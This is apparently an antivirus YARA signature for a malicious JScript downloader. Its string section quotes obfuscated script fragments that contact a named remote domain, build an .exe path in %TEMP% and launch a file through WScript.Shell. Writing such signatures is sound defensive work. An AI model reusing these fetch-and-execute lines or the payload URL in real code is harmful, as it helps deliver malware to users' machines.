rule sig_20160329_9060888f191f62e63fa2638966058f90 {
  meta:
    description = "datamaliciousorder - file 20160329_9060888f191f62e63fa2638966058f90.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dde1a10f67116708b54d69512e0098733a81a1c5aaa8116a73b9b5f1ca52c06b"

  strings:
    $s1  = "function Exiosfoujz() {return Okefx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vS3mV80r1L.exe\";};" fullword ascii
    $s2  = "var Okefx = function Bxihuaflu() {return WScript[Fcsftpbh](\"WScript.Shell\");}();" fullword ascii
    $s3  = "do {WScript[Arryxahuu](Knyyjcou() * 11)} while (Pygoyn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "Pygoyn[Nmysebc](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s5  = "function Yprhn(Ispibys, Tipjibuw){return Ispibys - Tipjibuw;};" fullword ascii
    $s6  = "function Bdkjshzfxm(){return Fcsftpbh;};" fullword ascii
    $s7  = "function Nfpvaes(Sidyktqfo){Okefx[\"Run\"](Sidyktqfo, Itwknr, Itwknr);};" fullword ascii
    $s8  = "var Lkxsy = new this[\"Date\"]();" fullword ascii
    $s9  = "var Zbhpiukgxn = false;" fullword ascii
    $s10 = "var Mkahtvkg = false;" fullword ascii
    $s11 = "return Yprhn(Gtqeipl, Kvfcwetr);" fullword ascii
    $s12 = "Mkahtvkg = true; " fullword ascii
    $s13 = " while (Wbaureqyav){" fullword ascii
    $s14 = "function Crnnxm(Qwrwl) {var Yasbsqayjr = (1, 2, 3, 4, 5, Qwrwl); return Yasbsqayjr;};" fullword ascii
    $s15 = "function Rcijbtskl()" fullword ascii
    $s16 = "function Ugctyrpsvy(){return Ovrngbqba;};" fullword ascii
    $s17 = "function Knyyjcou(){return 22;};" fullword ascii
    $s18 = "function Kwcapc() {return ((Mkahtvkg == true) && (Mkahtvkg == Ycrlimh)) ? 1 : Itwknr;};" fullword ascii
    $s19 = "var Ycrlimh = false;" fullword ascii
    $s20 = "Ycrlimh = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}